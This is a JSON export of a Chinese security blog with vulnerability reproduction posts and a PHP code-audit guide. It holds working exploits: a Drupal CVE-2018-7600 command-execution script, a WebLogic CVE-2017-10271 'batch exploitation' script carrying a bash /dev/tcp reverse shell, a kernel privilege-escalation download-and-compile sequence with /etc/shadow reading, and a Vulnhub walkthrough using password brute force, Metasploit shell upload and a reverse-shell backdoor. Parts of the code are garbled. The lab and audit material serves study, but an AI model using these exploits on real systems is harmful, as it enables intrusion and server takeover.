{"meta":{"title":"shackle","subtitle":null,"description":null,"author":"shackle","url":"https://shackles.top"},"pages":[{"title":"archives","date":"2018-03-30T00:25:32.000Z","updated":"2018-03-30T00:37:52.434Z","comments":true,"path":"archives/index.html","permalink":"https://shackles.top/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-03-30T00:25:45.000Z","updated":"2018-03-30T00:38:17.419Z","comments":true,"path":"categories/index.html","permalink":"https://shackles.top/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-03-30T00:25:51.000Z","updated":"2018-03-30T00:38:36.445Z","comments":true,"path":"tags/index.html","permalink":"https://shackles.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Drupal远程代码执行漏洞CVE-2018-7600","slug":"Drupal远程代码执行漏洞(CVE-2018-7600)","date":"2018-04-13T15:53:56.000Z","updated":"2018-04-14T12:33:04.758Z","comments":true,"path":"2018/04/13/Drupal远程代码执行漏洞(CVE-2018-7600)/","link":"","permalink":"https://shackles.top/2018/04/13/Drupal远程代码执行漏洞(CVE-2018-7600)/","excerpt":"","text":"Drupal远程代码执行漏洞CVE-2018-76000x00 漏洞分析12号国外大佬发了CVE-2018-7600的漏洞POC，国内大佬跟进，作为弱鸡也尝试一下。CVE-2018-7600远程代码执行漏洞的原因是由于Drupal对表单的渲染。 buildform用户可控，可以传入mail[#post_render]、mail[#type]数组，即用户注入。而后uploadAjaxCallback方法可解析上面的数组，call_user_fun对于对于部分#属性数组值处理，导致任意代码执行。当做元素解析。导致远程代码执行漏洞。 在Drupal中render方法里#pre_render在render之前操作数组，#post_render接收render的结果并在其添加包装，#lazy_builder用于在render过程的最后添加元素。 我们来调试 一下： 如图可以看出 数组 成功变为元素解析。 这样我们就可以通过构造mail[#post_render]形式的数组进行攻击。 0X01漏洞复现对于较新的版本。在本地复现成功：Drupal8.5.0，Drupal8.4.5，Drupal8.4.4，Drupal8.4.3； 通杀EXP！ 安装 Drupal8.5.0：额Drupal 带翻译可以在线下载。 https://ftp.drupal.org/files/projects/drupal-8.5.0.tar.gz Drupal8.4.4 https://ftp.drupal.org/files/projects/drupal-8.4.4.tar.gz 。。。 这样一看下载地址很清楚。 payload: 1http://localhost/drupal-8.5.0/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax post 内容： 123&apos;mail[a][#lazy_builder][0]&apos;: &apos;system&apos;,&apos;mail[a][#lazy_builder][1][]&apos;: &apos;whoami&apos;,&apos;form_id&apos;: &apos;user_register_form&apos; Python 小脚本1234567891011121314151617#!/usr/bin/envimport sysimport requestsurl = 'http://localhost/drupal-8.5.0/'payload = &#123; 'mail[test][#lazy_builder][0]': 'system', 'mail[test][#lazy_builder][1][]': 'whoami', 'form_id': 'user_register_form'&#125;target = url + 'user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax'r = requests.post(target, data=payload, verify=False)print(r.headers)print(r.text) 本地 Drupal8.5.0 复现成功 本地Drupal8.4.5 复现成功 本地Drupal8.4.4 复现成功 本地Drupal8.4.3复现成功 0X02 参考https://research.checkpoint.com/uncovering-drupalgeddon-2/ https://paper.seebug.org/567/","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://shackles.top/tags/漏洞复现/"}]},{"title":"Vulnhub 靶机渗透初见","slug":"BSides Vancouver","date":"2018-04-09T15:53:56.000Z","updated":"2018-04-30T06:48:33.551Z","comments":true,"path":"2018/04/09/BSides Vancouver/","link":"","permalink":"https://shackles.top/2018/04/09/BSides Vancouver/","excerpt":"","text":"Vulnhub 靶机渗透初见0X00 前言Vulnhub 是国外Vulnhub 团队建设的一套 靶机镜像网站，提供虚拟机的形式的靶机镜像、直接下载使用、一般来说是一个整套的系统(linux居多）。下面对平台上靶机系统进行渗透测试。 https://www.vulnhub.com/ 0X01 BSides Vancouver: 2018 (Workshop）下载地址：BSides Vancouver: 2018 (Workshop) ~ VulnHub，可使用种子下载，速度较快。 下载的VOA文件可用VirtualBox或者VMware Workstation导入使用。配置靶机的网络启动即可。 信息收集：老规矩先扫描，可以看到 存在FTP Anonymous访问访问漏洞， nbtscan 192.168.1.1/24nmap -A 192.168.1.32 下载 users.txt.bk 得到用户名 12345abatchyjohnmaiannedoomguy 漏洞利用wpscan -u http://192.168.1.32/backup_wordpress/wpscan -u http://192.168.1.32/backup_wordpress -username john –wordlist /usr/share/wordlists/rockyou.txt 利用 wp_admin_shell_upload 漏洞 爆破 密码得到enigma 1234567891011use exploit/unix/webapp/wp_admin_shell_uploadmsf exploit(unix/webapp/wp_admin_shell_upload) &gt;set rhost 192.168.1.32msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set targeturi /backup-wordpressmsf exploit(unix/webapp/wp_admin_shell_upload) &gt;set username johnmsf exploit(unix/webapp/wp_admin_shell_upload) &gt;set password enigmamsf exploit(unix/webapp/wp_admin_shell_upload) &gt;exploit 权限维持但是没有root权限，下一步需要提权。 一般来说 linux提权可以使用用exp提权，或者通过计划任务、SUID文件属性进行提权。这里使用计划任务，查看root用户执行的计划任务。cat crontab ，把远控脚本写入/usr/local/bin/cleanup中，执行，用nc反向连接。 msfvenom -p cmd / unix / reverse_python lhost = 192.168.1.63 lport = 9866 R #msfveom 生成python后门 上传python远控木马 nc -lvp 9866 # nc 反向监听 0X02 总结通过对以上靶机进行渗透测试，可以看出Vulnhub 靶机平台的靶机镜像环境还是不错的，平台提供初中高级的靶机镜像、从Web安全到系统安全也可以。基本可以涵盖大部分的渗透测试流程，可以较为方便的实验测试靶机。","categories":[],"tags":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"https://shackles.top/tags/靶机渗透/"}]},{"title":"","slug":"ctf-web","date":"2018-03-29T23:18:41.441Z","updated":"2018-03-29T14:11:49.898Z","comments":true,"path":"2018/03/30/ctf-web/","link":"","permalink":"https://shackles.top/2018/03/30/ctf-web/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"CVE-2017-16995 Ubuntu16.04漏洞","slug":"CVE-2017-16995 Ubuntu16.04","date":"2018-03-17T15:53:56.000Z","updated":"2018-04-03T14:39:52.215Z","comments":true,"path":"2018/03/17/CVE-2017-16995 Ubuntu16.04/","link":"","permalink":"https://shackles.top/2018/03/17/CVE-2017-16995 Ubuntu16.04/","excerpt":"","text":"CVE-2017-16995 Ubuntu16.04影响版本：Linux内核：Linux Kernel Version 4.14 ~ 4.4Ubuntu版本：16.04.01~ 16.04.04 提权 12345678使用cat /proc/version查看Linux内核版本 ：cat /etc/shadow查看账号密码payload:wget http://cyseclabs.com/pub/upstream44.cgcc -o test upstream44.c chmod +x exp./exp 漏洞原理emmmm 不懂 修复和缓解建议：目前暂未有明确的补丁升级方案。 建议用户在评估风险后，通过修改内核参数限制普通用户使用bpf(2)系统调用： 1# echo 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://shackles.top/tags/漏洞复现/"}]},{"title":"Weblogic 反序列化漏洞（CVE-2017-10271）","slug":"weblogin反序列漏洞（CVE-2017-10271)","date":"2017-11-05T15:53:56.000Z","updated":"2018-04-03T09:21:28.237Z","comments":true,"path":"2017/11/05/weblogin反序列漏洞（CVE-2017-10271)/","link":"","permalink":"https://shackles.top/2017/11/05/weblogin反序列漏洞（CVE-2017-10271)/","excerpt":"","text":"Weblogic 反序列化漏洞（CVE-2017-10271）Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。 参考链接： https://www.exploit-db.com/exploits/43458/ https://paper.seebug.org/487/ https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices组件反序列化漏洞分析.md http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html 环境搭建 nc 监听 21端口 python3 批量利用脚本 123456789101112131415161718192021222324252627282930313233343536import requestsheaders = &#123;\"Content-Type\": \"text/xml\"&#125;def exp(url): data = ''' &lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt; &lt;void class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.102/21 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; ''' respond = requests.post(url=url, data=data, headers=headers) if(respond.status_code == 500): print('success')if __name__ == '__main__': url = \"http://192.168.1.101:7001/wls-wsat/CoordinatorPortType\" exp(url)","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://shackles.top/tags/漏洞/"}]},{"title":"PHP 代码审计_知识点","slug":"PHP 代码审计_知识点","date":"2017-10-20T15:53:56.000Z","updated":"2018-04-04T13:03:53.687Z","comments":true,"path":"2017/10/20/PHP 代码审计_知识点/","link":"","permalink":"https://shackles.top/2017/10/20/PHP 代码审计_知识点/","excerpt":"","text":"PHP 代码审计_知识点来源于某大神~ 感谢！ 1.XSS1.1反射型XSS0x01漏洞背景XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。非持久型跨站：反射型跨站脚本漏洞，最普遍的类型。 0x02漏洞代码及分析 漏洞代码： 1234&lt;?phpusername = _GET['user'];echo \"用户名：\".$username;?&gt; 将用户输入的user内容直接输出到页面，未经过任何过滤。可导致XSS漏洞攻击 payload 1?user=&lt;script&gt;alart(1)&lt;/script&gt; - 修复建议：在接收输入后进行htmlspecialchars过滤，或者在输出前htmlspecialchars过滤 建议修复代码： 1234567&lt;?phpusername = _GET['user'];echo \"用户名：\".htmlspecialchars($username);?&gt; 1.2存储型XSS0x01漏洞背景XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。存储型跨站：危害大、恶意代码存储服务器(数据库) 0x02漏洞代码及分析 漏洞代码： 123456789101112131415if (!empty($_POST['content'])) &#123; $content = addslashes($_POST['content']); if ($mysqli - &gt;query(\"insert into test (content)values('$content')\")) &#123; echo '发言成功'; &#125; else &#123; echo '发言失败'; &#125;&#125;$data = $mysqli - &gt;query(\"select content from test\");if ($data - &gt;num_rows !== '0') &#123; $arr = $data - &gt;fetch_all(); foreach($arr as $a) &#123; echo '发言：'.$a[0].'&lt;br&gt;'; &#125;&#125; 用户发言的内容未进行字符串编码，直接存储到数据库中，并取出数据库中带有恶意代码的内容输出到网页中，导致XSS攻击 修复建议： 在接收输入后进行htmlspecialchars过滤，或者在输出前htmlspecialchars过滤 建议修复代码：echo ‘发言：’.htmlspecialchars($a[0]).’‘; 1.3 DOM XSS0x01漏洞背景XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。DOMXSS：一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。 0x02漏洞代码及分析漏洞代码1： 123456789101112131415&lt; ?phpimg = isset(GET['img']) ? htmlspecialchars($GET['img']) : 'default.jpg';? &gt;&lt;img src = \"\"id = \"image\" &gt;&lt;script &gt;var test = document.getElementById('image');test.src = '&lt;?php echo $img;?&gt;';&lt; /script&gt;/ 使用了htmlspecialchars进行过滤，但单引号没有过滤，导致DOMXSS修复建议：在接收输入后进行htmlspecialchars过滤，并且还有对单引号和反斜杠进行转义建议修复代码： 1img = isset(GET['img']) ? htmlspecialchars(addslashes($GET['img'])) : 'default.jpg'; 漏洞代码2: 123456789&lt; ?phpcontent = isset(GET['content']) ? htmlspecialchars($GET['content']) : '无内容';content = str_replace(\"'\", \"\\'\", content);? &gt;&lt;div id = \"content\" &gt; 这是测试内容 123456789&lt; /div&gt;&lt;script&gt;var test = document.getElementById('content');test.innerHTML = '&lt;?php echo $content;?&gt;';&lt;/script &gt; innerHTML、documen.write这种直接修改html内容的方法，应对其内容进行严格过滤，否则通过8进制或16进制编码可绕过htmlspecialchars过滤建议修复代码： 1$content = isset($_GET['content']) ? htmlspecialchars(addslashes($_GET['content'])) : '无内容'; 1.文件漏洞2.1文件读取漏洞0x01漏洞背景任意文件读取漏洞，是web安全里高危的漏洞，它可以泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。 0x02漏洞代码及分析漏洞代码1： 12345&lt; ?phptemplate = isset(GET['template']) ? $GET['template'] : 'index.html';file = file_get_contents('2.1/'.template);echo $file;? &gt; 未对../进行过滤，导致可以跨目录读取文件。未对后缀名进行限制，导致可以读取php文件内容。修复建议： payload： 1?template=../../../../etc/passwd 不允许..等跨目录字符出现，使用addslashes防止%00截断，且限制后缀白名单建议修复代码： 1234567891011template = isset(GET['template']) ? addslashes($GET['template']) : 'index.html';if (strstr(template, '..') || substr(template, -5, 5) != '.html')&#123; echo '输入不合法'; exit;&#125; 漏洞代码2： 123456789101112131415&lt; ?php action = isset(GET['action']) ? $GET['action'] : 'login'; fp = \"./2.1/\".action.\"/index.html\"; f = fopen(fp, 'r'); strout = fread(f, filesize($fp)); fclose($f); echo $strout;? &gt; 未对../进行过滤，导致可以跨目录读取文件。未过滤%00字节，在&lt;PHP5.3.4版本中，可在截断后自定义路径和文件名 payload: 1?action=../../../etc/passwd%00 修复建议： 不允许..等跨目录字符出现，使用addslashes防止%00截断建议修复代码： 1234567891011action = isset(GET['action']) ? addslashes($GET['action']) : 'login';if (strstr($template, '..'))&#123; echo '输入不合法'; exit;&#125; 2.2文件上传漏洞0x01漏洞背景上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。0x02漏洞代码及分析漏洞代码1： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt; ?phpif (isset($_FILES['file']))&#123; if ((_FILES[\"file\"][\"type\"] == \"image/gif\" || FILES \"file\" == \"image/jpeg\" || $FILES \"file\" == \"image/pjpeg\") &amp;&amp; $_FILES if ($_FILES \"file\" &gt; 0) &#123; echo \"Return Code: \".$_FILES \"file\".\"&lt;br /&gt;\"; &#125; else &#123; echo \"Upload: \".$_FILES \"file\".\"&lt;br /&gt;\"; echo \"Type: \".$_FILES \"file\".\"&lt;br /&gt;\"; echo \"Size: \".$_FILES \"file\" / 1024.\" Kb&lt;br /&gt;\"; echo \"Temp file: \".$_FILES \"file\".\"&lt;br /&gt;\"; if (file_exists(\"2.2/upload/\".$_FILES \"file\")) &#123; echo $_FILES \"file\".\" already exists. \"; &#125; else &#123; move_uploaded_file(_FILES[\"file\"][\"tmp_name\"], \"2.2/upload/\"._FILES \"file\"); echo \"Stored in: \".\"2.2/upload/\".$_FILES \"file\"; &#125; &#125;&#125; else &#123; echo \"Invalid file\";&#125;&#125;? &gt; 仅对Content-type验证，因为Content-type可以伪造导致可以绕过限制图片验证，导致任意文件上传修复建议：对后缀进行校验，采用白名单模式。保存文件名采用随机文件名+后缀的方式保存建议修复代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt; ?phpif (isset($_FILES['file']))&#123; ext = substr(FILES \"file\", strrpos($FILES \"file\", '.') + 1); filename = time().rand(100, 999).'.'.ext; if ((ext == \"jpg\" || ext == \"jpeg\" || ext == \"png\") &amp;&amp; _FILES \"file\" &lt; 20000) &#123; if ($_FILES \"file\" &gt; 0) &#123; echo \"Return Code: \".$_FILES \"file\".\"&lt;br /&gt;\"; &#125; else &#123; echo \"Upload: \".$_FILES \"file\".\"&lt;br /&gt;\"; echo \"Type: \".$_FILES \"file\".\"&lt;br /&gt;\"; echo \"Size: \".$_FILES \"file\" / 1024.\" Kb&lt;br /&gt;\"; echo \"Temp file: \".$_FILES \"file\".\"&lt;br /&gt;\"; if (file_exists(\"2.2/upload/\".$filename)) &#123; echo $filename.\" already exists. \"; &#125; else &#123; move_uploaded_file(_FILES[\"file\"][\"tmp_name\"], \"2.2/upload/\".filename); echo \"Stored in: \".\"2.2/upload/\".$filename; &#125; &#125; &#125; else &#123; echo \"Invalid file\"; &#125;&#125;? &gt; 漏洞代码2 1234567891011121314151617181920212223242526&lt; ?phpimageinfo = getimagesize(_FILES 'userfile');if (imageinfo['mime'] != 'image/gif' &amp;&amp; imageinfo['mime'] != 'image/jpeg') &#123; echo \"Sorry, we only accept GIF and JPEG images\\n\"; exit;&#125;$uploaddir = '2.2/upload/';uploadfile = uploaddir.basename($_FILES 'userfile');if (move_uploaded_file(_FILES['userfile']['tmp_name'], uploadfile)) &#123; echo \"File is valid, and was successfully uploaded.\\n\";&#125; else &#123; echo \"File uploading failed.\\n\";&#125;? &gt; 仅通过读取文件头判断文件类型，可被绕过；后缀名未进行校验，导致任意文件上传、修复建议：参考漏洞代码1的修复方式漏洞代码3 123456789101112131415161718192021222324252627282930&lt; ?php$blacklist = array(\".php\", \".phtml\", \".php3\", \".php4\");foreach(blacklist as item) &#123; if (preg_match(\"/&#123;item&#125;\\$/i\", _FILES 'userfile')) &#123; echo \"We do not allow uploading PHP files\\n\"; exit; &#125;&#125;$uploaddir = '2.2/upload/';uploadfile = uploaddir.basename($_FILES 'userfile');if (move_uploaded_file(_FILES['userfile']['tmp_name'], uploadfile)) &#123; echo \"File is valid, and was successfully uploaded.\\n\";&#125; else &#123; echo \"File uploading failed.\\n\";&#125;? &gt; 扩展名黑名单过滤不严，可上传.php5文件进行绕过。导致任意文件上传修复建议：参考漏洞代码1的修复方式 2.3文件写入漏洞0x01漏洞背景在生成配置文件或者缓存文件的时候，未对传入的内容进行过滤，导致php代码执行漏洞0x02漏洞代码及分析漏洞代码1： 123456789101112131415161718&lt; ?phpif (isset(_POST['debug']))&#123; setting = _POST['debug']; $content = \"&lt;?php\\r\\n\"; content. = \"\\$YCF['debug'] = '\".setting.\"';\\r\\n\"; $content. = \"?&gt;\"; file_put_contents(\"2.3/config.php\", $content);&#125;? &gt; 未对传入内容进行任何过滤，用单引号绕出去可以引起代码执行漏洞修复建议：进行addslashes函数过滤。且不要拼接在双引号内，否则同样会引起代码执行漏洞建议修复代码： 1$setting = addslashes($_POST['debug']); 2.4文件删除漏洞0x01漏洞背景删除文件时对路径或文件名过滤不严，会导致任意文件删除 0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920&lt; ?phpif (@$_GET['action'] == 'del')&#123; if (isset($_GET['img'])) &#123; img = _GET['img']; unlink('2.4/'.$img); echo '删除图片成功'; &#125;&#125;? &gt; 对删除文件过滤不严，导致任意文件删除。修复建议：不允许..等跨目录字符出现。进行addslashes函数过滤建议修复代码： 1234567891011img = addslashes(_GET['img']);if(strstr($img, '..'))&#123;echo '输入不合法';exit;&#125; 3.1文件包含漏洞0x01漏洞背景如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。通常是由于include、require引起恶意包含0x02漏洞代码及分析漏洞代码1： 12345678910111213&lt; ?phpif ($_GET['func']) &#123; include $_GET['func'];&#125; else &#123; include '3.1/default.php';&#125;? &gt; 在未过滤的情况下，可包含带有恶意代码的JPG文件、日志文件，甚至可以远程包含修复建议：不允许..等跨目录字符出现，对前缀跟后缀都进行限制，使用addslashes过滤%00防止被截断包含建议修复代码： 12345678910111213141516171819202122232425&lt; ?phpif ($_GET['func']) &#123; file = addslashes(_GET['func']); if (strstr($file, '..')) &#123; echo '输入不合法'; exit; &#125; include '3.1/'.$file.'.php';&#125; else &#123; include '3.1/default.php';&#125;? &gt; 3.2 preg_replace漏洞0x01漏洞背景preg_replace /e 修正符使 preg_replace() 将 replacement 参数当作 PHP代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法 的 PHP代码字符串，否则 PHP会在报告在包含 preg_replace()的行中出现语法解析错误。 0x02漏洞代码及分析漏洞代码1： 12345678910111213141516171819&lt; ?phpecho preg_replace(\"/test/e\", $_GET[\"h\"], \"jutst test\");? &gt;漏洞代码2：&lt; ?phpfunction test($str)&#123;&#125;echo preg_replace(\"/sphp[/php]s/ies\", 'test(\"\\1\")', $_GET[\"h\"]);? &gt; 语法不当的情况下，会导致代码执行漏洞修复建议： 避免使用/e模式，第一、二个参数不让用户可控。第二个参数单引号改成双引号建议修复代码： 1echo preg_replace(\"/sphp[/php]s/ies\", \"test('\\1')\", $_GET[\"h\"]); 3.3回调漏洞0x01漏洞背景在PHP一些回调函数中，如果函数输入可控，可以利用回调assert等方法进行命令执行漏洞0x02漏洞代码及分析 漏洞代码1： 123456789101112131415&lt; ?phpcall_user_func(_REQUEST['fun'], _REQUEST['pass']);? &gt; 漏洞代码2： &lt; ?phparray_map(_REQUEST['fun'], _REQUEST['pass']);? &gt; 在fun传递可控的情况下，会引起代码执行漏洞 修复建议： 第一个参数不让用户可控 建议修复代码：array_map(‘addslashes’, $_REQUEST[‘pass’]);参考文章：https://www.leavesongs.com/penetration/php-callback-backdoor.html 4.1命令执行漏洞0x01漏洞背景exec、system、shell_exec、passthru等命令执行函数，在传入的命令过滤不严，可导致任意命令执行漏洞，危及服务器。 0x02漏洞代码及分析漏洞代码1： 123456789&lt; ?phpurl = _GET[&apos;url&apos;];content = system(&quot;curl url&quot;);echo $content;? &gt; 直接将可控内容带入命令执行中，导致产生漏洞漏洞代码2： 1234567891011121314151617181920212223242526272829303132333435363738&lt; ?phpif (isset($_REQUEST[&apos;ip&apos;])) &#123; target = trim(_REQUEST[&apos;ip&apos;]); $substitutions = array( &apos;&amp;&apos; = &gt;&apos;&apos;, &apos;;&apos; = &gt;&apos;&apos;, &apos;|&apos; = &gt;&apos;&apos;, &apos;-&apos; = &gt;&apos;&apos;, &apos;$&apos; = &gt;&apos;&apos;, &apos;(&apos; = &gt;&apos;&apos;, &apos;)&apos; = &gt;&apos;&apos;, &apos;`&apos; = &gt;&apos;&apos;, &apos;||&apos; = &gt;&apos;&apos;, ); target = str_replace(array_keys(substitutions), substitutions, target); cmd = shell_exec(&apos;ping -c 4 &apos;.target); echo $target; echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;? &gt; 虽然进行了一些过滤，但是过滤不严，%0a可绕过命令执行修复建议：不要让用户可控的内容带入命令执行中参考文章：http://www.freebuf.com/articles/web/137923.html 5.1普通注入漏洞0x01漏洞背景SQL注入是攻击者通过把恶意SQL命令插入到Web表单的输入域或页面请求的查询字符串中，来达到欺骗服务器执行恶意的SQL命令的一种攻击方式0x02漏洞代码及分析 漏洞代码1： 123456789101112131415161718192021222324&lt; ?php$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;); //数据库连接id = !empty(GET[&apos;id&apos;]) ? $GET[&apos;id&apos;] : &apos;1&apos;;data = mysqli - &gt;query(&quot;select content from test where id=$id&quot;);if ($data - &gt;num_rows !== &apos;0&apos;)&#123; arr = data - &gt;fetch_all(); foreach(arr as a) &#123; echo &apos;内容：&apos;.$a[0].&apos;&lt;br&gt;&apos;; &#125;&#125;? &gt; 对于传入的内容未过滤，且SQL拼接的时候没有单引号保护 修复建议：使用单引号保护并过滤内容建议修复代码： 123456789101112131415161718192021222324252627282930id = !empty(GET[&apos;id&apos;]) ? addslashes($GET[&apos;id&apos;]) : &apos;1&apos;;data = mysqli - &gt;query(&quot;select content from test where id=&apos;$id&apos;&quot;);漏洞代码2：&lt; ?php$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;); //数据库连接id = !empty(GET[&apos;id&apos;]) ? $GET[&apos;id&apos;] : &apos;1&apos;;data = mysqli - &gt;query(&quot;select content from test where id=&apos;$id&apos;&quot;);if ($data - &gt;num_rows !== &apos;0&apos;)&#123; arr = data - &gt;fetch_all(); foreach(arr as a) &#123; echo &apos;内容：&apos;.$a[0].&apos;&lt;br&gt;&apos;; &#125;&#125;? &gt; 即使使用了单引号保护，但是传入内容未过滤，导致SQL注入修复建议：参考代码1修复 漏洞代码3： 1234567891011121314151617181920212223242526&lt; ?php$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;); //数据库连接if (!empty($_POST[&apos;content&apos;]))&#123; name = _POST[&apos;name&apos;]; content = _POST[&apos;content&apos;]; if (mysqli - &gt;query(&quot;insert into test (content)values(&apos;name&apos;,&apos;$content&apos;)&quot;)) &#123; echo &apos;发言成功&apos;; &#125; else &#123; echo &apos;发言失败&apos;; &#125;&#125;? &gt; insert型注入，差不多的注入方式。修复建议： 对SQL拼接时一定要单引号保护，整数型也不例外，并且传入的值要经过addslashes函数过滤。不过最好的方案还是用PDO预处理修复代码： 12345name = addslashes(_POST[&apos;name&apos;]);content = addslashes(_POST[&apos;content&apos;]);if(mysqli-&gt;query(&quot;insert into test (content)values(&apos;name&apos;,&apos;$content&apos;)&quot;)) 5.2宽字节注入漏洞0x01漏洞背景宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用charactersetclient设置值进行了一次编码 0x02漏洞代码及分析漏洞代码1： 123456789101112131415161718192021222324252627&lt;?php$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;);//数据库连接id = !empty(GET[&apos;id&apos;]) ? addslashes($GET[&apos;id&apos;]) : &apos;1&apos;;$mysqli-&gt;query(&quot;SET NAMES &apos;gbk&apos;&quot;);data = mysqli-&gt;query(&quot;select content from test where id=&apos;$id&apos;&quot;);if($data-&gt;num_rows !== &apos;0&apos;)&#123;arr = data-&gt;fetch_all();foreach(arr as a)&#123;echo &apos;内容：&apos;.$a[0].&apos;&lt;br&gt;&apos;;&#125;&#125;?&gt; 执行SET NAMES ‘gbk’之后会引起宽字节注入漏洞，绕过单引号达到注入效果修复建议：字符集编码设置成utf8建议修复代码：$mysqli-&gt;query(“SET NAMES ‘utf8’”); 5.3字符集漏洞0x01漏洞背景默认情况下，Mysql的字符集就是latin1，Mysql字段的字符集和php mysqli客户端设置的字符集不相同导致可能绕过登录等情况0x02漏洞代码及分析漏洞代码1： 12345678910111213141516171819202122232425262728293031&lt;?php$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;);//数据库连接if(!empty(_POST[&apos;username&apos;]) &amp;&amp; !empty(_POST[&apos;password&apos;]))&#123;username = addslashes(_POST[&apos;username&apos;]);password = addslashes(_POST[&apos;password&apos;]);data = mysqli-&gt;query(&quot;select * from user where username=&apos;username&apos; and password=&apos;password&apos;&quot;);if($data-&gt;num_rows !== &apos;0&apos;)&#123;arr = data-&gt;fetch_row();session_start();_SESSION[&apos;username&apos;] = arr[1];echo &apos;登录成功&apos;;&#125;&#125;?&gt; 例如管理员账号是admin，注册admin%c2，登录之后就是管理员权限了修复建议：将数据库字符集修改为utf8参考文章：https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html 6.1 hash比较绕过0x01漏洞背景===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较==在进行比较的时候，会先将字符串类型转化成相同，再比较如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行0x02漏洞代码及分析漏洞代码1： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt; ?phpif (isset(_GET[&apos;Username&apos;]) &amp;&amp; isset(_GET[&apos;password&apos;])) &#123; $logined = true; Username = _GET[&apos;Username&apos;]; password = _GET[&apos;password&apos;]; if (!ctype_alpha($Username)) &#123; $logined = false; &#125; if (!is_numeric($password)) &#123; $logined = false; &#125; if (md5(Username) != md5(password)) &#123; $logined = false; &#125; if ($logined) &#123; echo &quot;successful&quot;; &#125; else &#123; echo &quot;login failed!&quot;; &#125;&#125;? &gt; 0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。导致弱类型比较绕过修复建议： 将 ==换成 ===建议修复代码：if (md5($Username) !== md5($password)) { 6.2 json绕过0x01漏洞背景===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较==在进行比较的时候，会先将字符串类型转化成相同，再比较如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 0x02漏洞代码及分析漏洞代码1： 12345678910111213141516171819202122232425&lt; ?phpif (isset($_POST[&apos;message&apos;])) &#123; message = json_decode(_POST[&apos;message&apos;]); $key = &quot;*****&quot;; if (message - &gt;key == key) &#123; echo &quot;flag&quot;; &#125; else &#123; echo &quot;fail&quot;; &#125;&#125; else &#123; echo &quot;~~~~&quot;;&#125;? &gt; json_decode之后可以解析成布尔型，可以传入true绕过比较修复建议：将 ==换成 ===建议修复代码：if ($message-&gt;key === $key) { 6.3 